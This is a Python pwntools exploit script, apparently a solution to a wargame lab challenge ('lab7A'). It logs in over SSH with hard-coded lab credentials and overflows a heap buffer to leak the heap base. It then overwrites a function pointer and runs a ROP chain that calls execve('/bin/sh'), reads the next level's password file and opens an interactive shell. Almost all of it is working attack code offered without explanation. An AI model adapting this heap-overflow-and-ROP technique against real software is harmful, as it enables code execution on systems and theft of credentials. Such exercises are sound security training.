from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab7A', password = 'us3_4ft3r_fr33s_4re_s1ck')
r = s.remote("localhost", 7741)
context.log_level = 'debug'
def create(length: int, data: bytes):
        r.recv()
        r.sendline(b'1')
        sleep(1)
        r.sendlineafter(b'Enter data length: ', str(length).encode())
        r.sendafter(b'data to encrypt: ', data)
        sleep(1)
def edit(idx, data):
        r.recv()
        r.sendline(b'2')
        r.sendlineafter(b'index to edit: ', str(idx).encode())
        r.sendlineafter(b'encrypt: ', data)
def print_string(idx):
        r.recv()
        r.sendline(b'4')
        r.sendlineafter(b'index to print: ', idx)
        sleep(1)

add_pop_3_gadget = 0x0804f92e
puts = 0x8050bf0
pop_eax = 0x080bd226
pop_ebx = 0x080481c9
pop_ecx = 0x080e76ad
pop_edx = 0x080adcb2
mov_ptr_edx_ecx = 0x080562d2
bss = 0x080edfc0
message = 0x80eef60
main = 0x8049569
int_0x80 = 0x08048ef6
pop_ebp = 0x0804838e
leave_ret = 0x08048d88
xchg_eax_esp = 0x0804bb6c

### Leak heap base

create(131, b'A' * 128 + p16(0xffff) + p8(0xff))
create(3, b'B' * 3)
edit(0, b'A' * 128 + p32(0xffffffff) + p32(0) + p32(0x00000111) + p32(add_pop_3_gadget))
print_string(b'1\x00' + b'A' * 6 + p32(puts) + p32(main) + p32(message))

sleep(0.5)
heap_base = u32(r.recv(4)) - 0x19f8
log.info(f"Heap base: {hex(heap_base)}")
rop_addr = heap_base + 0x1e28

payload = p32(pop_ecx)
payload += b'/bin'
payload += p32(pop_edx)
payload += p32(bss)
payload += p32(mov_ptr_edx_ecx)
payload += p32(pop_ecx)
payload += b'/sh\x00'
payload += p32(pop_edx)
payload += p32(bss + 4)
payload += p32(mov_ptr_edx_ecx)
payload += p32(pop_eax)
payload += p32(11)
payload += p32(pop_ebx)
payload += p32(bss)
payload += p32(pop_ecx)
payload += p32(0)
payload += p32(pop_edx)
payload += p32(0)
payload += p32(int_0x80)

create(131, b'A' * 128 + p16(0xffff) + p8(0xff))
create(5, b'A' * 5)

edit(2, b'A' * 128 + p32(0xffffffff) + p32(0) + p32(0x111) + p32(add_pop_3_gadget) + b'A' * 252 + payload)

print_string(b'3\x00' + b'A' * 6 + p32(pop_eax) + p32(rop_addr) + p32(xchg_eax_esp)) #execve("/bin/sh")

r.sendline(b'cat /home/lab7end/.pass')
r.interactive()
